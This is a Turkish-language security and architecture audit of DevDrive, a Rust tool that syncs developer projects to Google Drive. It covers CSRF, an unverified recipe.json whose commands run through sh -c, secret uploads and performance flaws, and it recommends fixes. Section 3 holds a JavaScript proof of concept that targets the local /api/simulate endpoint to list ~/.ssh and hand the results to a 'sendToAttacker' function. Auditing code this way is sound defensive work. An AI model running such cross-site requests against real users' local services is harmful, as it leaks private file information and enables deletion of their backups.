# ⚡ DevDrive Proje İnceleme, Güvenlik, Mimari ve Derin Analiz Raporu

DevDrive (`devdrive`) projesinin tüm kaynak kodları, mimari katmanları, test altyapısı, derleme süreçleri ve güvenlik mekanizmaları çift aşamalı derin inceleme sürecinden geçirilmiştir.

Bu raporda projenin mevcut durumu, doğrulanmış güvenlik zafiyetleri, mimari ve performans darboğazları, ölü kodlar ve kapsamlı geliştirme tavsiyeleri sunulmaktadır.

---

## 1. 🔍 Proje Genel Mimarisi & Mevcut Durum

DevDrive, macOS üzerinde 256 GB gibi kısıtlı yerel SSD'ye sahip geliştiricilerin bulut sürücülerini (özellikle 5 TB Google Drive) CPU patlaması, dosya kilitleme veya I/O darboğazı yaşamadan birincil çalışma alanı olarak kullanabilmesini sağlayan akıllı bir dosya sistemi ve önbellekleme aracıdır.

* **Stack & Altyapı:** Rust (2024 Edition), Tokio, Axum 0.7, Rusqlite 0.31 (WAL modunda), Notify-debouncer-mini (FSEvents), Tar, Flate2.
* **Derleme & Test Durumu:** Proje derlenmekte (`cargo check` başarılı, 0 hata) ve 40 adet birim/adversarial testin tümü başarıyla geçmektedir (`17 lib + 13 adversarial + 10 offload test`).
* **Clippy:** `src/offload.rs` ve `src/main.rs` içinde 57 adet `collapsible_if` ve `needless_borrow` uyarısı mevcuttur (`cargo clippy --fix`).
* **Temel Modüller:**
  * [`src/filter.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/filter.rs): Ephemeral (çöp) ve Source ayrımı yapan kalkan (`DevFilter`).
  * [`src/cache.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/cache.rs): İçerik-adreslenebilir depolama (CAS), APFS zero-copy `clonefile` ve LRU tahliyesi.
  * [`src/db.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/db.rs): SQLite WAL modunda metadata, snapshot, WAL kuyruğu ve offload günlüğü.
  * [`src/snapshot.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/snapshot.rs): Git'ten bağımsız anlık mikro-görüntü, diff ve atomik geri sarma (rollback).
  * [`src/wal.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/wal.rs): Dosya değişikliklerini sıraya alan ve deduplicate/debounce eden Write-Ahead Log.
  * [`src/watcher.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/watcher.rs): macOS FSEvents tabanlı debounced dinleyici.
  * [`src/sync.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/sync.rs): Google Drive eşitleme motoru, `.conflict_<ts>` kalkanı ve `.trash` kasası.
  * [`src/offload.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs): Sınıf A (reproducible) temizleme, Sınıf B (`tree.tar.gz`) arşivleme ve 7 günlük yerel karantina.
  * [`src/ui.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs): Axum REST API ve [`assets/dashboard.html`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/assets/dashboard.html) paneli.
  * [`src/config.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/config.rs): macOS CloudStorage yolunu dinamik tespit eden konfigürasyon.
  * [`src/main.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/main.rs): CLI arayüzü ve macOS LaunchAgent servis yöneticisi.

---

## 2. ⚖️ İnceleme Bulgularının Karşılaştırmalı Özeti

| No | Konu | Kodun ve Sistemin Gösterdiği Gerçek | Durum / Seviye |
|---|---|---|---|
| **1** | **AppleScript / Shell Parametre Kaçışı** | `replace('"', "\\\"")` tüm tırnakları kaçışladığından RCE riski bulunmamaktadır; ancak ters bölü (`\`) karakterleri AppleScript sözdizimini bozarak klasör seçiciyi (picker) çökertebilir (DoS). Argüman dizisi (`argv`) kullanılmalıdır. | 🟡 Orta (DoS / Kırılganlık) |
| **2** | **Web Arayüzünde CSRF & Origin Koruması Eksikliği** | [`remove_all_projects_handler`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs#L1501-L1534) hiçbir parametre beklemeden tüm projeleri takipten çıkarır. Dış sitelerden tek bir POST formuyla tetiklenebilir. | 🔴 Kritik Zafiyet |
| **3** | **`recipe.json` Üzerinden Keyfi Komut Çalıştırma** | [`archive_verify`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L715-L745) yalnızca `manifest.json` ve `tree.tar.gz`'yi doğrular. `recipe.json` doğrulanmadığı için Drive üzerindeki bu dosyaya yazılan zararlı komutlar `unarchive --rebuild` ile çalıştırılabilir. | 🔴 Kritik Zafiyet |
| **4** | **`.devdriveignore` Motorlara Hiçbir Yerde Bağlanmamış (Ölü Kod)** | [`DevFilter::for_project`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/filter.rs#L105) yazılmış fakat `watcher`, `sync`, `wal`, `ui` modüllerinin tamamı varsayılan `DevFilter::new()` çağırmaktadır. Proje bazlı ignore kuralları çalışmaz. | 🔴 Kritik Mimari Hata |
| **5** | **`/api/simulate` Üzerinden Keyfi Dizin Taraması (Info Leak)** | Endpoint, `path` parametresini sınırlandırmaksızın rekürsif tarar. CSRF açığıyla birleştiğinde dış siteler `~/.ssh` gibi hassas dizinlerin dosya listesini çalabilir. | 🔴 Kritik Güvenlik Açığı |
| **6** | **`.env` Gizlilik Çelişkisi** | Sync motorunda `.env` korunurken, `config.backup_env_files` varsayılan `true` olduğu için `devdrive offload` tüm `.env` dosyalarını `tree.tar.gz` içine paketleyip Drive'a yüklemektedir. | 🟠 Yüksek Seviye |
| **7** | **Eşitlemede (Sync) Değişmeyen Dosyalarda Bile Drive Dosyasının SHA-256'sının Hesaplanması** | `safe_sync_file`, `mtime` ve `size` kontrolünden önce hem kaynak hem de remote dosyanın tamamını okuyup SHA-256 hesaplar. macOS FileProvider'ı kilitler ve yüksek CPU harcar. | 🟠 Yüksek Performans Hatası |
| **8** | **Atomik Olmayan `unarchive` ile Kalıcı Proje Kilitlenmesi** | Arşiv açılırken hata oluşursa yarım kalan klasör silinmez. Tekrar denendiğinde `target_local_path.exists()` engeli nedeniyle elle silinene kadar geri yükleme kilitlenir. | 🟠 Yüksek Veri Güvenliği Hatası |
| **9** | **`include_git = false` Durumunda Git Geçmişinin Sessizce Silinmesi** | `include_git = false` iken `.git` klasörü arşive alınmaz, yerel karantinaya taşınır ve karantina temizlendiğinde (`purge`) unpushed commit'ler dahil tüm geçmiş kalıcı olarak silinir. | 🟠 Yüksek Veri Kaybı Riski |
| **10** | **`get_status` Senkron Disk Taraması (Tokio Thread Kilidi)** | Her `/api/status` çağrısında 3 adet rekürsif `WalkDir` doğrudan async worker üzerinde çalıştırılır. Frontend ise her 600 ms'de bir sorgulamaktadır. | 🟡 Orta Performans Kusuru |
| **11** | **LRU Tahliyesinin Snapshot'ları Bozması** | `evict_lru`, `snapshots` tablosuna bakmaksızın en eski CAS nesnelerini silmektedir. Silinen nesneye ait snapshot'a geri dönülmek istendiğinde rollback başarısız olur. | 🟡 Orta Seviye Kusur |
| **12** | **LaunchAgent Servisinin İzleme Yapmaması** | `com.devdrive.ui.plist` yalnızca Web UI'ı başlatmaktadır; arka planda FSEvents izleyici thread'i (`watch`) çalışmamaktadır. | 🟡 Orta Seviye Eksiklik |
| **13** | **Dashboard'da DOM Kırılması ve XSS (Tek Tırnak Hatası)** | Inline `onclick` parametrelerinde `p.local_path` veya `p.name` tek tırnak içerirse (ör. `/Desktop/John's App`) butonlar sözdizimi hatası vererek tıklanamaz hale gelir. | 🟡 Orta Seviye Arayüz Hatası |
| **14** | **Her HTTP İsteğinde Sıfırdan SQLite DDL ve Pragma Çalıştırılması** | Her handler çağrısında `Database::open` yapılarak 5 PRAGMA ve 9 DDL sorgusu çalıştırılmaktadır. | 🟡 Orta Seviye Kaynak İsrafı |
| **15** | **`wal_events` Tablosunun Hiç Temizlenmemesi** | Senkronize edilmiş olaylar için hiçbir `DELETE` sorgusu yoktur; tablo zamanla şişer. | 🟡 Orta Seviye Eksiklik |
| **16** | **Google Drive Yabancı Dil Desteği Eksikliği** | Yalnızca `Drive'ım` ve `My Drive` klasörleri kontrol edilmektedir. Almanca, Fransızca, İspanyolca vb. macOS dillerinde Drive bulunamaz. | ⚪ Düşük Seviye |
| **17** | **`reveal_in_finder` Güvenlik Eksikliği** | `open -R <path>` yerine `open <path>` kullanıldığı için hedef dosya bir script veya app ise Finder'da seçilmek yerine doğrudan çalıştırılır. | ⚪ Düşük Seviye |

---

## 3. 🚨 Detaylı Güvenlik Açıkları ve Kritik Eksiklikler

### 🔴 1. `.devdriveignore` Motorlara Hiçbir Yerde Bağlanmamış (Ölü Kod)
* **Etkilenen Dosyalar:**
  * [`src/watcher.rs:23`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/watcher.rs#L23): `filter: DevFilter::new()`
  * [`src/sync.rs:110, 193, 494, 610, 740`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/sync.rs#L494): `let filter = DevFilter::new();`
  * [`src/snapshot.rs:63`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/snapshot.rs#L63): `filter: DevFilter::new()`
  * [`src/wal.rs:43`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/wal.rs#L43): `filter: DevFilter::new()`
  * [`src/ui.rs:325, 1112`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs#L325): `DevFilter::new()`
* **Kanıt ve Analiz:**
  [`filter.rs:105`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/filter.rs#L105) içinde projeye özel `.devdriveignore` dosyasını okuyup ayrıştıran `DevFilter::for_project(project_path)` fonksiyonu yazılmış ve birim testi eklenmiştir.
  **Ancak projenin canlı çalışan hiçbir bileşeni bu fonksiyonu çağırmamaktadır!** Canlı motorların tümü projenin yolunu bilmelerine rağmen varsayılan `DevFilter::new()` kurucusunu çağırmaktadır.
* **Sonuç:** Kullanıcı projesinin köküne devasa yapay zeka modellerini (`models/*.bin`), veri setlerini (`*.csv`) veya videoları yoksaymak için `.devdriveignore` eklese dahi, sistem bunu **tamamen göz ardı etmekte**; bu devasa dosyaları snapshot'lara almakta, WAL'a kaydetmekte ve Google Drive'a yüklemeye çalışmaktadır.

---

### 🔴 2. Web Arayüzünde CSRF & Origin Koruması Eksikliği
* **Etkilenen Kod:** [`src/ui.rs:246-276`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs#L246-L276) (`start_ui_server`), [`src/ui.rs:1501-1534`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs#L1501-L1534) (`remove_all_projects_handler`).
* **Kanıt ve Analiz:**
  Axum sunucusu `127.0.0.1:port` adresine bağlanmaktadır; ancak hiçbir endpoint'te (örneğin `/api/project/remove-all`, `/api/project/clean-remote`, `/api/project/purge`, `/api/config`) CSRF token'ı, API anahtarı veya `Origin` / `Sec-Fetch-Site` kontrolü bulunmamaktadır.
  [`remove_all_projects_handler`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs#L1501-L1534) hiçbir gövde (body) veya parametre bile beklemeden `unregister_all_projects()` çalıştırmaktadır.
* **Saldırı Senaryosu:**
  Kullanıcı tarayıcısında gezinirken arkada çalışan kötü niyetli bir web sayfası JavaScript ile `fetch("http://127.0.0.1:4040/api/project/clean-remote", ...)` veya basit bir HTML form POST isteği tetikleyerek Google Drive'daki tüm proje yedeklerini kalıcı olarak silebilir veya takipten çıkarabilir.

---

### 🔴 3. `/api/simulate` Üzerinden Keyfi Dosya Sistemi Bilgi Sızıntısı
* **Etkilenen Kod:** [`src/ui.rs:1105-1162`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/ui.rs#L1105-L1162) (`simulate_handler`).
* **Kanıt ve Analiz:**
  `/api/simulate` endpoint'i gelen JSON gövdesindeki `path` parametresini hiçbir sınırlandırma veya beyaz liste kontrolü olmadan doğrudan `canonicalize()` edip `walkdir::WalkDir` ile taramaktadır.
  Tarama sonucunda bulunan ilk 25 kaynak dosyasının ve 25 geçici dosyasının bağıl yollarını (`sample_sources`, `sample_ephemerals`), dosya adetlerini ve bayt boyutlarını JSON olarak döndürmektedir.
* **Saldırı Senaryosu:**
  Web arayüzünde CSRF ve Origin koruması olmadığından, kullanıcının tarayıcısında açık olan herhangi bir web sayfası arka planda:
  ```javascript
  fetch("http://127.0.0.1:4040/api/simulate", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path: "/Users/serhat/.ssh" })
  }).then(r => r.json()).then(data => sendToAttacker(data.data.sample_sources));
  ```
  çağrısı yaparak kullanıcının Mac'indeki gizli SSH anahtar isimlerini, `.aws/credentials` varlığını veya özel belge isimlerini sessizce çalabilir.

---

### 🟠 4. `unarchive --rebuild` İçinde Mühürsüz `recipe.json` ile Keyfi Komut Çalıştırma
* **Etkilenen Kod:** [`src/offload.rs:1050-1070`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L1050-L1070).
* **Kanıt ve Analiz:**
  `archive_verify` fonksiyonu yalnızca `manifest.json` dosyasını `manifest.sha256` ile doğrular. Google Drive arşiv klasöründe bulunan `recipe.json` dosyası **hiçbir şekilde hash kontrolüne veya dijital imzaya tabi tutulmaz**.
  ```rust
  if let Ok(recipe) = serde_json::from_str::<Recipe>(&content) {
      for cmd in &recipe.rebuild_commands {
          let output = std::process::Command::new("sh")
              .arg("-c")
              .arg(cmd)
              .current_dir(&target_local_path)
              .output();
      }
  }
  ```
  Google Drive klasörüne erişimi olan (veya senkronize edilmiş bir makinedeki) herhangi biri `recipe.json` dosyasındaki `rebuild_commands` alanına zararlı komut yazarsa, kullanıcı `devdrive unarchive --rebuild` komutunu çalıştırdığında bu keyfi komutlar sorgusuz sualsiz çalıştırılır.

---

### 🟠 5. Eşitlemede (Sync) Değişmeyen Dosyalarda Bile Drive Dosyasının SHA-256'sının Hesaplanması
* **Etkilenen Kod:** [`src/sync.rs:207-214`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/sync.rs#L207-L214) (`safe_sync_file`).
* **Hatalı Akış:**
  ```rust
  let src_hash = CacheManager::compute_sha256(src_file)?;

  if dst_file.exists() {
      let dst_hash = CacheManager::compute_sha256(dst_file)?; // <-- GOOGLE DRIVE ÜZERİNDEKİ DOSYA!
      if src_hash == dst_hash {
          return Ok(SyncFileResult::Unchanged);
      }
      // Zaman damgası kontrolü hash'ler FARKLIYSA yapılıyor!
  ```
* **Kanıt ve Analiz:**
  Standart senkronizasyon araçları dosyanın değişip değişmediğini anlamak için önce **boyut (size)** ve **değiştirilme zamanını (mtime)** kontrol eder (`stat`).
  DevDrive ise remote dosyanın mtime'ını zaten local ile eşitlemesine rağmen ([`sync.rs:249-251`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/sync.rs#L249-L251)), dosya kontrolünde önce `src_file` ve `dst_file`'ın **tüm gövdesini okuyup SHA-256 hesaplamaktadır**!
* **Sonuç:** 10.000 dosyadan oluşan bir projede tek bir harf dahi değişmemiş olsa bile, `devdrive sync` komutu hem yerel SSD'deki 10.000 dosyayı hem de Google Drive bulutundaki 10.000 dosyayı baştan sona okuyarak 20.000 SHA-256 özeti çıkarır. Bu durum macOS FileProvider'ı kilitler, CPU'yu %100'e vurur ve SSD ömrünü tüketir.

---

### 🟠 6. Atomik Olmayan `unarchive` ve Kalıcı Proje Kilitlenmesi
* **Etkilenen Kod:** [`src/offload.rs:921-927`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L921-L927) ve [`src/offload.rs:968-986`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L968-L986).
* **Kanıt ve Analiz:**
  `unarchive` fonksiyonu Drive arşivinden çıkarma yaparken doğrudan hedef yerel klasörü (`target_local_path`) oluşturur ve `tree.tar.gz` paketini bu klasöre açar.
  Eğer arşiv açılırken disk dolar, internet kopar veya 986. satırdaki SHA-256 doğrulama hatası alınırsa (`bail!`), işlem yarım kalır ve `target_local_path` klasörü diskte bırakılır.
  Kullanıcı komutu tekrar çalıştırdığında:
  ```rust
  if target_local_path.exists() {
      bail!("Hedef yerel dizin '{}' zaten mevcut! Çakışmayı önlemek için işlem durduruldu.", target_local_path.display());
  }
  ```
  kontrolü devreye girer. Kullanıcı terminale girip o klasörü elle silene kadar projeyi geri getirmek imkansız hale gelir.

---

### 🟠 7. `include_git = false` Durumunda Git Geçmişinin Sessizce Silinmesi
* **Etkilenen Kod:** [`src/offload.rs:281-285`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L281-L285) ve [`src/offload.rs:671`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L671).
* **Kanıt ve Analiz:**
  Eğer kullanıcı veya config `include_git = false` olarak ayarlarsa, `.git` klasörü Sınıf B arşiv paketine (`tree.tar.gz`) dahil edilmez.
  Ardından projenin tamamı yerel karantinaya taşınır. Karantina süresi dolup `purge` çalıştırıldığında yerel `.git` klasörü kalıcı olarak silinir.
  Kullanıcı projeyi Drive'dan geri getirdiğinde (`unarchive`), Drive arşivinde `.git` bulunmadığından **tüm commit geçmişi, dallar (branches), stash'ler ve unpushed commit'ler sıfırlanmış olur**. Kullanıcıya hiçbir uyarı verilmemektedir.

---

### 🟠 8. `.env` Gizlilik Çelişkisi
* **Etkilenen Kod:** [`src/filter.rs:194`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/filter.rs#L194) vs [`src/config.rs:73`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/config.rs#L73) ve [`src/offload.rs:265-278`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/offload.rs#L265-L278).
* **Kanıt ve Analiz:**
  [`filter.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/filter.rs) içinde `.env` dosyaları `TransientLock` olarak sınıflandırılmış ve "Asla Google Drive veya CAS'a gönderilmez" ilkesi getirilmiştir.
  Ancak [`config.rs`](file:///Users/serhat/Documents/antigravity/adventurous-hypatia/src/config.rs) dosyasında `backup_env_files` varsayılan olarak `true` tanımlanmıştır.
  Sonuç olarak, bir kullanıcı `devdrive offload <proje> --yes` çalıştırdığında, projedeki tüm API anahtarları, şifreler ve gizli değişkenleri içeren `.env`, `.env.production` dosyaları `tree.tar.gz` paketine konularak **Google Drive'a arşiv olarak yüklenmektedir**.

---

## 4. 💡 Kapsamlı Geliştirme ve İyileştirme Yol Haritası

### 1. Güvenlik ve Yetkilendirme (Öncelik: Kritik)
1. **API Token & Local CSRF Shield:**
   - Web sunucusu ayağa kalkarken kriptografik bir `session_token` üretmeli, dashboard HTML'ine yerleştirmeli ve gelen tüm mutasyon (POST) isteklerinde `X-DevDrive-Token` başlığını zorunlu kılmalıdır.
   - `Sec-Fetch-Site: same-origin` veya `Origin: http://127.0.0.1:<port>` kontrolü middleware olarak eklenmelidir.
2. **AppleScript Parametre İzolasyonu:**
   - `osascript -e` string formatlama yerine argüman dizisi ile çalıştırılmalıdır:
     ```rust
     let script = "on run argv\ntell application \"System Events\"\nactivate\nreturn POSIX path of (choose folder with prompt (item 1 of argv))\nend tell\nend run";
     Command::new("osascript").arg("-e").arg(script).arg(&prompt).output();
     ```
3. **`recipe.json` Hash Doğrulaması:**
   - `recipe.json`'ın SHA-256 özeti `manifest.json` içine dahil edilmeli; `unarchive --rebuild` çalıştırılmadan önce doğrulanmalıdır. Rebuild komutları serbest shell string'i yerine sabit bir izin listesine (`npm ci`, `cargo build`, `pnpm install`, `uv sync`) tabi tutulmalıdır.
4. **`.env` Karantina İzolasyonu:**
   - `.env` dosyaları Google Drive'a gidecek `tree.tar.gz` arşivinden tamamen çıkarılmalı; bu dosyalar yalnızca yerel karantina (`~/.devdrive/quarantine`) kasasında tutulmalıdır.

### 2. Mimari ve Performans (Öncelik: Yüksek)
1. **`.devdriveignore` Entegrasyonunun Sağlanması:**
   - `WorkspaceWatcher::new`, `SyncEngine::new`, `SnapshotEngine::new` ve `ui.rs` içindeki çağrılar `DevFilter::for_project(path)` kullanacak şekilde güncellenmelidir.
2. **Hızlı Eşitleme (Stat-first Sync):**
   - `safe_sync_file` fonksiyonunda önce dosya boyutu ve mtime kontrolü yapılmalı; mtime ve size eşleşiyorsa dosya SHA-256 hesaplanmadan `Unchanged` olarak kabul edilmelidir.
3. **Atomik Unarchive Mimarisi:**
   - `unarchive` doğrudan hedef klasöre değil, `.unarchive_tmp_<id>` klasörüne açılmalı; doğrulama bittikten sonra atomik `rename` yapılmalıdır.
4. **SQLite Bağlantı Havuzu & Pragma İyileştirmesi:**
   - Her HTTP isteğinde DDL (`CREATE TABLE`) çalıştırma sonlandırılmalı; şema bir kez açılışta başlatılmalı ve `AppState` içinde paylaşılan bir bağlantı havuzu tutulmalıdır.
5. **CAS Pinning:**
   - Snapshot'lar tarafından referans verilen CAS hash'leri SQLite'tan sorgulanmalı ve bu nesneler `evict_lru` temizliğinden muaf tutulmalıdır.
6. **WAL Temizliği (Pruning):**
   - Eşitlenen WAL kayıtları için `DELETE FROM wal_events WHERE synced = 1 AND timestamp < ?` temizleme rutini eklenmelidir.

### 3. Kullanıcı Deneyimi ve Kod Kalitesi
1. **Gerçek Arka Plan Eşitlemesi (Sync Daemon):**
   - `watch` komutuna debounce sonrası belirli bir süre (örneğin 5 saniye) boyunca yeni olay gelmediğinde `sync_pending` çağıran otomatik bir arka plan flush mekanizması eklenmelidir.
2. **Dashboard Güvenliği ve XSS Koruması:**
   - HTML oluşturulurken `p.name` ve `p.local_path` değişkenleri HTML/JS escape fonksiyonundan geçirilmeli veya doğrudan `data-project-id` öznitelikleri üzerinden `addEventListener` ile bağlanmalıdır.
3. **README Güncellemesi:**
   - Yeni eklenen `scan`, `clean-artifacts`, `offload`, `unarchive`, `archive-verify`, `diff`, `purge` ve `service` komutları kullanım örnekleriyle README'ye eklenmelidir.
4. **Clippy Düzeltmeleri:**
   - `cargo clippy` tarafından işaret edilen 57 adet `collapsible_if` uyarısı `cargo clippy --fix` ile temizlenmelidir.

---

## 5. 📋 Kalan Sorular ve Açık Noktalar

1. **Çoklu Makine / Paylaşımlı Drive Çakışma Çözümü (Conflict Resolution):**
   - İki farklı Mac aynı anda aynı Google Drive klasörüne eşitleme yaptığında, `safe_sync_file` yalnızca `mtime` karşılaştırması yapmaktadır. Farklı makinelerin saat farkları (clock skew) durumunda daha yeni olan dosya eski sayılarak hatalı conflict üretebilir. Distributed clock (veya Google Drive etag/generation) bazlı bir çakışma protokolü gelecekte test edilmelidir.
2. **Google Drive Dataless/Placeholder Dosya Davranışı:**
   - macOS FileProvider'ın yerel SSD'den tahliye ettiği (dataless/cloud-only) dosyaların DevDrive tarafından okunması sırasında işletim sisteminin kullanıcıya sunduğu ağ gecikmesi ve indirme kotalarının simülasyon ortamında uçtan uca test edilmesi gerekmektedir.
3. **Takip Eden Geliştirici İçin İlk Odak Noktası:**
   - Sıradaki geliştiricinin derhal **`.devdriveignore` dosyasını `DevFilter::for_project` ile tüm motorlara bağlaması** ve **web arayüzüne token/CSRF koruması eklemesi** önerilir.
